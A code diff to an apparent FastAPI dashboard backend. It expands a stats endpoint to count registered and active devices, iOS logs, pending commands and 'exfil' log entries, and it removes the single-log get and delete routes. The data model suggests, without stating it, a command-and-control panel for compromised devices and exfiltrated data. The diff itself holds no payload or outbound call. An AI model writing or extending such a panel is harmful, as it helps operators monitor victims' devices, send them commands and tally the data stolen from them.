@@ -44,8 +44,12 @@ async def get_logs(
 
 @router.get("/stats", response_model=StatsResponse)
 async def get_log_stats(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
+    from ..database import Device, Command
     total_requests = db.query(Log).count()
-    total_devices = db.query(Log.ip).distinct().count()
+    total_devices = db.query(Device).count()
+    active_devices = db.query(Device).filter(Device.status == "active").count()
+    ios_logs = db.query(Log).filter(Log.log_type == "ios").count()
+    pending_commands = db.query(Command).filter(Command.status == "pending").count()
     total_exfil = db.query(Log).filter(Log.log_type == "exfil").count()
     
     today_start = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
@@ -69,7 +73,10 @@ async def get_log_stats(db: Session = Depends(get_db), current_user=Depends(get_
     return {
         "total_requests": total_requests,
         "total_devices": total_devices,
+        "active_devices": active_devices,
         "total_exfil": total_exfil,
+        "ios_logs": ios_logs,
+        "pending_commands": pending_commands,
         "today_requests": today_requests,
         "today_exfil": today_exfil,
         "request_trend": request_trend,
@@ -99,21 +106,3 @@ async def clear_logs(
     deleted = query.delete(synchronize_session=False)
     db.commit()
     return {"message": f"Cleared {deleted} logs"}
-
-
-@router.get("/{log_id}", response_model=LogResponse)
-async def get_log(log_id: int, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
-    log = db.query(Log).filter(Log.id == log_id).first()
-    if not log:
-        raise HTTPException(status_code=404, detail="Log not found")
-    return log
-
-
-@router.delete("/{log_id}")
-async def delete_log(log_id: int, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
-    log = db.query(Log).filter(Log.id == log_id).first()
-    if not log:
-        raise HTTPException(status_code=404, detail="Log not found")
-    db.delete(log)
-    db.commit()
-    return {"message": "Log deleted"}
